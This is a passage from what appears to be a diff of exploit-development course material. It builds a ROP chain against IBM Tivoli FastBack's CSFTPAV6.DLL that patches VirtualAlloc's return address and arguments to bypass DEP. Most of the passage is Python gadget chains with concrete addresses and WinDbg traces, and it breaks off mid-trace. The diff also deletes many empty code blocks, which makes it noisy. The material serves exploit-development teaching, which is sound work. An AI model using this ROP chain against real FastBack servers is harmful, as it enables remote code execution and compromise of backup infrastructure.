+eip=5051cbb8 esp=0d5fe350 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
+CSFTPAV6!FtpUploadFileW+0xbd1a:
+5051cbb8 c3              ret
+```
 
-```nasm
+`dds esi L1`
 
 ```
+0d5fe300  76da38c0 KERNEL32!VirtualAllocStub
+```
 
+Listing 55 - Overwriting placeholder with VirtualAlloc
 
-```nasm
+We have now achieved the goal we set at the beginning of this section. We successfully patched the address of VirtualAlloc at runtime in the API call skeleton placed on the stack by the buffer overflow.
+Keep in mind that understanding how to build these types of ROP chains and how they work is critical to bypassing DEP and obtaining code execution.
 
-```
+In the next section, we will need to set up the API call return address in order to be able to execute our shellcode after the VirtualAlloc call.
 
-```nasm
+### Patching the Return Address
 
-```
+When a function is called in assembly, the CALL instruction not only transfers execution flow to the function address, but at the same time pushes the return address to the top of the stack. Once the function finishes, the CPU aligns the stack pointer to the return address, which is then popped into EIP.
 
+Since we control execution through the use of ROP gadgets, normal practices do not apply. Once we get to the point of executing VirtualAlloc, we will jump to it by returning into its address on the stack. This will not place any further return address on the stack.
+To ensure that execution flow continues to our shellcode once the API finishes, we must manually place the shellcode address on the stack, right after the address of VirtualAlloc to simulate a real call. This way, our shellcode address will be at the top of the stack when VirtualAlloc finishes its job and executes a return instruction.
+In this section, we must solve a problem very similar to patching the address of VirtualAlloc. First, we must align ESI with the placeholder value for the return address on the stack. Then we need to dynamically locate the address of the shellcode and use it to patch the placeholder value.
 
-```nasm
+At the end of the last section, ESI contained the address on the stack where VirtualAlloc was written. This means that ESI is only four bytes lower than the stack address we need. An instruction like ADD ESI, 0x4 would be ideal, but it does not exist in our selected module.
+A common instruction we might find in a gadget is the incremental (INC) instruction. These instructions increase the value in a register by one.
+In our case, we can find an INC ESI instruction in multiple gadgets. None of the gadgets are clean, but it's possible to find one without any bad side effects, as shown in Listing 56.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+...
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
 
+Listing 56 - Increasing ESI by 4
 
-```nasm
+In this listing, most of the ROP gadgets from the previous section have been omitted for brevity. Notice that we use the increment instruction four times to have ESI increased by four bytes. The side effect will only modify EAX, which we do not have to worry about at this point.
+After setting our breakpoint at this new gadget and executing the updated ROP chain, we find that the increment gadgets are executed:
+0:066> bp 0x50522fa7
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
 
-```
+`g`
 
+```
+Breakpoint 0 hit
+eax=76da38c0 ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe300 edi=00000000
+eip=50522fa7 esp=0d4fe354 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
+CSFTPAV6!FtpUploadFileW+0x12109:
+50522fa7 46              inc     esi
+```
 
-```nasm
+`dd esi L2`
 
 ```
-
+0d4fe300  76da38c0 46464646
+```
 
-```nasm
+`p`
 
 ```
+eax=76da38c0 ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe301 edi=00000000
+eip=50522fa8 esp=0d4fe354 ebp=51515151 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+CSFTPAV6!FtpUploadFileW+0x1210a:
+50522fa8 042b            add     al,2Bh
+```
 
+`p`
 
+```
+eax=76da38eb ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe301 edi=00000000
+eip=50522faa esp=0d4fe354 ebp=51515151 iopl=0         nv up ei ng nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
+CSFTPAV6!FtpUploadFileW+0x1210c:
+50522faa c3              ret
+...
+eax=76da3841 ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe303 edi=00000000
+eip=50522fa7 esp=0d4fe360 ebp=51515151 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+CSFTPAV6!FtpUploadFileW+0x12109:
+50522fa7 46              inc     esi
+```
 
-```nasm
+`p`
 
 ```
-
+eax=76da3841 ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe304 edi=00000000
+eip=50522fa8 esp=0d4fe360 ebp=51515151 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+CSFTPAV6!FtpUploadFileW+0x1210a:
+50522fa8 042b            add     al,2Bh
+```
 
-```nasm
+`dd esi L1`
 
+```
+0d4fe304  46464646
 ```
 
+Listing 57 - Increasing ESI by 4
 
-```nasm
+In Listing 57, we skipped from the first INC ESI to the last. Here we find that ESI is now pointing to the address of the placeholder value for the return address, which was initially set as 0x46464646.
+With ESI aligned correctly, we need to get the shellcode address in EAX so that we can reuse the "MOV DWORD [ESI], EAX ; RET" gadget to patch the placeholder value. The issue we face now is that we do not know the exact address of the shellcode since it will be placed after our ROP chain, which we haven't finished creating yet.
 
-```
+We will solve this problem by using the value in ESI and adding a fixed value to it. Once we finish building the ROP chain, we can update the fixed value to correctly align with the beginning of the shellcode.
+First, we need to copy ESI into EAX. We need to do this in such a way that we keep the existing value in ESI, since we need it there to patch the placeholder value. An instruction like "MOV EAX, ESI" is optimal, but unfortunately, the only gadgets containing this instruction also pop a value into ESI. We can however solve this by restoring the value in ESI with the previously-used "PUSH EAX ; POP ESI ; RET" gadget.
+Since we need to add a small positive offset to EAX, we have to deal with null bytes again. We can solve this once more by using a negative value.
 
+Here we can simply use an arbitrary value, such as 0x210 bytes, represented as the negative value 0xfffffdf0. (The reason we use 0x210 instead of 0x200 is to avoid null bytes.)
 
-```nasm
+We pop this negative value into ECX and use a gadget containing a SUB EAX, ECX instruction to set up EAX correctly. The required gadgets are given in Listing 58 as part of the updated ROP chain.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+...
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
+rop += pack("<L", (0x42424242)) # junk
+rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret
+rop += pack("<L", (0xfffffdf0)) # -0x210
+rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
+
+Listing 58 - Getting shellcode address in EAX
 
+Let's execute the ROP chain. This time, we can't simply set a breakpoint on the gadget that moves ESI into EAX and single-step from there, because we use it in an earlier part of the ROP chain.
+Instead, we will let the breakpoint trigger twice before we start single-stepping.
 
-```nasm
+`bp 0x5050118e`
 
 ```
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
+```
 
-```nasm
+`g`
 
 ```
-
+Breakpoint 0 hit
+eax=00000000 ebx=05f2bd30 ecx=0d1fca70 edx=77071670 esi=0d1fe31c edi=00000000
+eip=5050118e esp=0d1fe320 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6+0x118e:
+5050118e 8bc6            mov     eax,esi
+```
 
-```nasm
+`g`
 
 ```
-
+Breakpoint 0 hit
+eax=76da386c ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=0d1fe304 edi=00000000
+eip=5050118e esp=0d1fe364 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+CSFTPAV6+0x118e:
+5050118e 8bc6            mov     eax,esi
+```
 
-```nasm
+`p`
 
 ```
-
+eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=0d1fe304 edi=00000000
+eip=50501190 esp=0d1fe364 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+CSFTPAV6+0x1190:
+50501190 5e              pop     esi
+```
 
-```nasm
+`p`
 
 ```
-
+eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=42424242 edi=00000000
+eip=50501191 esp=0d1fe368 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+CSFTPAV6+0x1191:
+50501191 c3              ret
+```
 
-```nasm
+`p`
 
+```
+eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=42424242 edi=00000000
+eip=5052f773 esp=0d1fe36c ebp=51515151 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+CSFTPAV6!FtpUploadFileW+0x1e8d5:
+5052f773 50              push    eax
 ```
 
+`p`
 
+```
+eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=42424242 edi=00000000
+eip=5052f774 esp=0d1fe368 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+CSFTPAV6!FtpUploadFileW+0x1e8d6:
+5052f774 5e              pop     esi
+```
 
-```nasm
+`p`
 
 ```
-
+eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=0d1fe304 edi=00000000
+eip=5052f775 esp=0d1fe36c ebp=51515151 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+CSFTPAV6!FtpUploadFileW+0x1e8d7:
+5052f775 c3              ret
+```
 
-```nasm
+`p`
 
 ```
-
+eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=0d1fe304 edi=00000000
+eip=505115a3 esp=0d1fe370 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+CSFTPAV6!FtpUploadFileW+0x705:
+505115a3 59              pop     ecx
+```
 
-```nasm
+`p`
 
 ```
-
+eax=0d1fe304 ebx=05f2bd30 ecx=fffffdf0 edx=77071670 esi=0d1fe304 edi=00000000
+eip=505115a4 esp=0d1fe374 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+CSFTPAV6!FtpUploadFileW+0x706:
+505115a4 c3              ret
+```
 
-```nasm
+`p`
 
 ```
-
+eax=0d1fe304 ebx=05f2bd30 ecx=fffffdf0 edx=77071670 esi=0d1fe304 edi=00000000
+eip=50533bf4 esp=0d1fe378 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+CSFTPAV6!FtpUploadFileW+0x22d56:
+50533bf4 2bc1            sub     eax,ecx
+```
 
-```nasm
+`p`
 
 ```
+eax=0d1fe514 ebx=05f2bd30 ecx=fffffdf0 edx=77071670 esi=0d1fe304 edi=00000000
+eip=50533bf6 esp=0d1fe378 ebp=51515151 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0x22d58:
+50533bf6 c3              ret
+```
 
-```nasm
+`dd eax L4`
 
+```
+0d1fe514  43434343 43434343 43434343 43434343
 ```
 
+Listing 59 - Calculating the shellcode address
 
-```nasm
+Listing 59 shows that we successfully copied the value from ESI to EAX, while also restoring the original value in ESI. In addition, we subtracted a large negative value from EAX to add a small positive number to it. Once we know the exact offset from ESI to the shellcode, we can update the 0xfffffdf0 value to the correct one.
+At this point, EAX contains a placeholder address for our shellcode, which we can update once we finish building the entire ROP chain.
+The last step of this section is to overwrite the fake shellcode address (0x46464646) value on the stack. Once again, we can do this using a gadget containing a "MOV DWORD [ESI], EAX" instruction.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+...
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
+rop += pack("<L", (0x42424242)) # junk
+rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret
+rop += pack("<L", (0xfffffdf0)) # -0x210
+rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
 
+Listing 60 - Writing return address to the stack
 
-```nasm
+This time, we can repeat the action of setting a breakpoint on the last gadget and continue execution until we trigger it the second time. Once we've done that, we can step through it as displayed in Listing 61.
 
-```
+`bp 0x5051cbb6`
 
+```
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
+```
 
-```nasm
+`g`
 
 ```
-
+Breakpoint 0 hit
+eax=76da38c0 ebx=05f9bc20 ecx=ffffffff edx=77071670 esi=0d1de300 edi=00000000
+eip=5051cbb6 esp=0d1de350 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
+CSFTPAV6!FtpUploadFileW+0xbd18:
+5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d1de300=45454545
+```
 
-```nasm
+`g`
 
+```
+Breakpoint 0 hit
+eax=0d1de514 ebx=05f9bc20 ecx=fffffdf0 edx=77071670 esi=0d1de304 edi=00000000
+eip=5051cbb6 esp=0d1de37c ebp=51515151 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0xbd18:
+5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d1de304=46464646
 ```
 
+`p`
 
+```
+eax=0d1de514 ebx=05f9bc20 ecx=fffffdf0 edx=77071670 esi=0d1de304 edi=00000000
+eip=5051cbb8 esp=0d1de37c ebp=51515151 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0xbd1a:
+5051cbb8 c3              ret
+```
 
-```nasm
+`dd poi(esi) L4`
 
 ```
+0d1de514  43434343 43434343 43434343 43434343
+```
 
+Listing 61 - Overwriting the return address placeholder
 
-```nasm
+Here we find that the gadget containing the "MOV DWORD [ESI], EAX" instruction successfully overwrote the placeholder value and the new return address points to our buffer.
 
-```
+After patching the return address, it is clear that building a ROP chain requires creativity. We also find that reusing the same gadgets helps when performing similar actions.
+In the next section, we are going to set up the four arguments required for VirtualAlloc.
 
+### Patching Arguments
 
-```nasm
+We have successfully created and executed a partial ROP chain that locates the address of VirtualAlloc from the IAT and the shellcode address, and then updates the API call skeleton on the stack.
+In this section, we must patch all four arguments required by VirtualAlloc to disable DEP.
 
+Listing 62 repeats the prototype of VirtualAlloc, which includes the four required arguments.
+
+```C
+ LPVOID WINAPI VirtualAlloc(
+   _In_opt_ LPVOID lpAddress,
+   _In_     SIZE_T dwSize,
+   _In_     DWORD  flAllocationType,
+   _In_     DWORD  flProtect
+ );
 ```
 
+Listing 62 - VirtualAlloc function prototype
 
-```nasm
+To reiterate, lpAddress should be the shellcode address, dwSize should be 0x01, flAllocationType should be 0x1000, and flProtect should be 0x40.
 
-```
+First, we are going to handle lpAddress, which should point to the same value as the return address.
 
+At the end of the last section, ESI contained the address on the stack where the return address (shellcode address) was written. This means that ESI is only four bytes lower than lpAddress, and we can realign the register by reusing the same INC ESI instructions as we used before.
+Additionally, since lpAddress needs to point to our shellcode, we can reuse the same gadgets as before and only subtract a different negative value from EAX.
 
-```nasm
+In the previous example, we used the somewhat arbitrary value of -0x210 to align EAX to our shellcode. Since we increased ESI by 4, we need to use -0x20C or 0xfffffdf4 this time, as shown in the updated ROP chain below.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+...
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
+rop += pack("<L", (0x42424242)) # junk
+rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret
+rop += pack("<L", (0xfffffdf4)) # -0x20c
+rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
 
+Listing 63 - Fetching and writing lpAddress
 
-```nasm
+The new part of the ROP chain also reuses the write gadget to overwrite the placeholder value in the API skeleton call.
 
-```
+It is getting a lot easier to expand on our technique because we have already located most of the required gadgets and performed similar actions.
 
+To verify our ROP chain, we execute it. We set a breakpoint on the last gadget like we did in the last section, only this time we must continue execution until it is triggered the third time:
 
-```nasm
+`bp 0x5051cbb6`
 
 ```
-
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
+```
 
-```nasm
+`g`
 
 ```
-
+Breakpoint 0 hit
+eax=75f238c0 ebx=05ffafe8 ecx=ffffffff edx=77251670 esi=0d46e300 edi=00000000
+eip=5051cbb6 esp=0d46e350 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
+CSFTPAV6!FtpUploadFileW+0xbd18:
+5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d46e300=45454545
+```
 
-```nasm
+`g`
 
+```
+Breakpoint 0 hit
+eax=0d46e514 ebx=05ffafe8 ecx=fffffdf0 edx=77251670 esi=0d46e304 edi=00000000
+eip=5051cbb6 esp=0d46e37c ebp=51515151 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0xbd18:
+5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d46e304=46464646
 ```
 
+`g`
 
+```
+Breakpoint 0 hit
+eax=0d46e514 ebx=05ffafe8 ecx=fffffdf4 edx=77251670 esi=0d46e308 edi=00000000
+eip=5051cbb6 esp=0d46e3a8 ebp=51515151 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+CSFTPAV6!FtpUploadFileW+0xbd18:
+5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d46e308=00000000
+```
 
-```nasm
+`dd eax L4`
 
 ```
+0d46e514  43434343 43434343 43434343 43434343
+```
 
+Listing 64 - The first argument is written to the stack
 
-```nasm
+We find that EAX points to our placeholder shellcode location and that it contains the same address when the breakpoint is triggered the second and third times. This means that our calculation was correct and the same shellcode location is going to be used for the return address and lpAddress.
 
-```
+Now we are going to move to dwSize, which we can set to 0x01, since VirtualAlloc will apply the new protections on the entire memory page. The issue is that the value is really a DWORD (0x00000001), so it will contain null bytes.
 
+Once again, we must use a trick to avoid them, and in this case, we can take advantage of another math operation, negation. The NEG1 instruction will replace the value in a register with its two's complement.2
 
-```nasm
+This is equivalent to subtracting the value from zero. When we do that with 0xffffffff (after ignoring the upper DWORD of the resulting QWORD), we get 0x01 (Listing 65):
 
-```
+`? 0 - ffffffff`
 
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
 ```
-
-
-```nasm
-
+Evaluate expression: -4294967295 = ffffffff`00000001
 ```
 
+Listing 65 - Subtracting 0xffffffff from 0 yields 0x1
 
-```nasm
+Stripping the upper part is done automatically since registers on a 32-bit operating system can only contain the lower DWORD.
+The steps we must perform for dwSize are:
+•	Increase the ESI register by four with the increment gadgets to align it with the next placeholder argument in the API skeleton call.
+•	Pop the value 0xffffffff into EAX and then negate it.
+•	Write EAX onto the stack to patch the dwSize argument.
+Listing 66 shows this implementation in the updated ROP chain.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+...
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
+rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
+rop += pack("<L", (0xffffffff)) # -1 value that is negated
+rop += pack("<L", (0x50527840)) # neg eax ; ret
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
 
+Listing 66 - Fetching and writing dwSize argument
 
+When we execute the update ROP chain, we can set a breakpoint on the gadget containing the POP EAX instruction. We have already used it once before, so we need to continue to the second time the breakpoint is triggered:
 
-```nasm
+`bp 0x5053a0f5`
 
 ```
-
-
-```nasm
-
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
 ```
-
 
-```nasm
+`g`
 
 ```
-
-
-```nasm
-
+Breakpoint 0 hit
+eax=0d57e300 ebx=05fabe40 ecx=ffffffe4 edx=77071670 esi=0d57e300 edi=00000000
+eip=5053a0f5 esp=0d57e338 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+CSFTPAV6!FtpUploadFileW+0x29257:
+5053a0f5 58              pop     eax
 ```
 
-```nasm
+`g`
 
 ```
-
-```nasm
-
+Breakpoint 0 hit
+eax=0d57e5c0 ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000
+eip=5053a0f5 esp=0d57e3bc ebp=51515151 iopl=0         nv up ei ng nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296
+CSFTPAV6!FtpUploadFileW+0x29257:
+5053a0f5 58              pop     eax
 ```
-
 
-```nasm
+`p`
 
 ```
-
-
-```nasm
-
+eax=ffffffff ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000
+eip=5053a0f6 esp=0d57e3c0 ebp=51515151 iopl=0         nv up ei ng nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296
+CSFTPAV6!FtpUploadFileW+0x29258:
+5053a0f6 c3              ret
 ```
-
 
-```nasm
+`p`
 
 ```
-
-
-```nasm
-
+eax=ffffffff ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000
+eip=50527840 esp=0d57e3c4 ebp=51515151 iopl=0         nv up ei ng nz ac pe nc
